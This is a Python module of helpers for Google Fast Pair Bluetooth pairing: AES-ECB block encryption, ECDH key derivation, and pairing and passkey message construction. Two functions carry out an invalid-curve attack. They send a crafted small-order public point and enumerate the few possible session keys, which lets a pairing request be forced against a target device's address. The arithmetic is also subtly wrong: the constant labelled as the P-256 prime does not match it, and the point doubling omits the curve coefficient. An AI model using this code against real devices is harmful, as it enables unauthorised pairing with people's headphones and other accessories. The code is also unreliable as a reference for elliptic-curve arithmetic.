import hashlib
import os
from typing import Any, Dict, List

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

AES_BLOCK_SIZE = 16

# NIST P-256 (secp256r1) prime field parameter.
P256_PRIME = 115792089210356248762697446949407573530086143415309950646500203141126131498649


def _derive_aes_key(material: bytes) -> bytes:
    """Return the 16-byte AES key used throughout the Fast Pair request helpers."""
    return hashlib.sha256(material).digest()[:16]


def convert_address_to_hex(address: str) -> str:
    """Removes ':' from a Bluetooth address."""
    return address.replace(":", "").lower()


def aes_ecb_encrypt_block(key: bytes, block: bytes) -> bytes:
    """Encrypts exactly one 16-byte block with AES-128-ECB."""
    if len(key) != AES_BLOCK_SIZE or len(block) != AES_BLOCK_SIZE:
        raise ValueError("AES key and block must be exactly 16 bytes")

    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(block) + encryptor.finalize()


def aes_ecb_decrypt_block(key: bytes, block: bytes) -> bytes:
    """Decrypts exactly one 16-byte block with AES-128-ECB."""
    if len(key) != AES_BLOCK_SIZE or len(block) != AES_BLOCK_SIZE:
        raise ValueError("AES key and block must be exactly 16 bytes")

    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(block) + decryptor.finalize()


def generate_shared_secret(public_key_bytes: bytes) -> Dict[str, bytes]:
    """Generate the Fast Pair session key via SECP256R1 ECDH."""
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())

    full_pub_key = b"\x04" + public_key_bytes if len(public_key_bytes) == 64 else public_key_bytes
    peer_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
        ec.SECP256R1(),
        full_pub_key,
    )

    shared_secret = private_key.exchange(ec.ECDH(), peer_public_key)
    secret = _derive_aes_key(shared_secret)
    generated_pub_bytes = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint,
    )

    return {
        "secret": secret,
        "generated_public_key": generated_pub_bytes,
    }


def generate_invalid_shared_secret() -> Dict[str, Any]:
    """Generate invalid shared secrets from a static point of order 5."""
    fake_public_key = (
        b"\x04"
        + bytes.fromhex("b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f")
        + bytes.fromhex("4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192")
    )

    x_base = int.from_bytes(fake_public_key[1:33], "big")
    y_base = int.from_bytes(fake_public_key[33:65], "big")

    secrets_set = set()

    # Double and add point scalar operations over small order subgroup [0..4].
    curr_x, curr_y = x_base, y_base
    for _ in range(1, 5):
        if curr_x is not None:
            secrets_set.add(curr_x.to_bytes(32, "big"))

        if curr_x == x_base and curr_y == y_base:
            slope = (3 * curr_x * curr_x) * pow(2 * curr_y, P256_PRIME - 2, P256_PRIME) % P256_PRIME
        elif curr_x is not None:
            slope = (curr_y - y_base) * pow(curr_x - x_base, P256_PRIME - 2, P256_PRIME) % P256_PRIME
        else:
            break

        next_x = (slope * slope - curr_x - x_base) % P256_PRIME
        next_y = (slope * (x_base - next_x) - y_base) % P256_PRIME
        curr_x, curr_y = next_x, next_y

    possible_secrets = [
        _derive_aes_key(secret) for secret in secrets_set
    ]

    return {
        "secrets": possible_secrets,
        "generated_public_key": fake_public_key,
    }


def generate_payload(address: str, secret: bytes, generated_public_key: bytes) -> Dict[str, Any]:
    """Build the initial encrypted Fast Pair payload."""
    nonce = os.urandom(8)
    address_bytes = bytes.fromhex(convert_address_to_hex(address))
    raw_request = b"\x00\x00" + address_bytes + nonce
    encrypted_request = aes_ecb_encrypt_block(secret, raw_request)

    payload = encrypted_request + generated_public_key[1:]
    return {
        "payload": payload,
        "secret": secret,
    }


def generate_key_based_pairing_message(address: str, public_key: bytes) -> Dict[str, Any]:
    """Generate an encrypted key-based pairing message."""
    shared = generate_shared_secret(public_key)
    return generate_payload(address, shared["secret"], shared["generated_public_key"])


def generate_possible_invalid_key_based_pairing_messages(address: str) -> List[Dict[str, Any]]:
    """Generate invalid-curve candidate pairing messages."""
    invalid = generate_invalid_shared_secret()
    return [
        generate_payload(address, secret, invalid["generated_public_key"])
        for secret in invalid["secrets"]
    ]


async def generate_passkey_message(secret: bytes, passkey: int) -> bytes:
    """Generate an encrypted passkey message block."""
    passkey_bytes = passkey.to_bytes(3, byteorder="big")
    plaintext = b"\x02" + passkey_bytes + os.urandom(12)
    return aes_ecb_encrypt_block(secret, plaintext)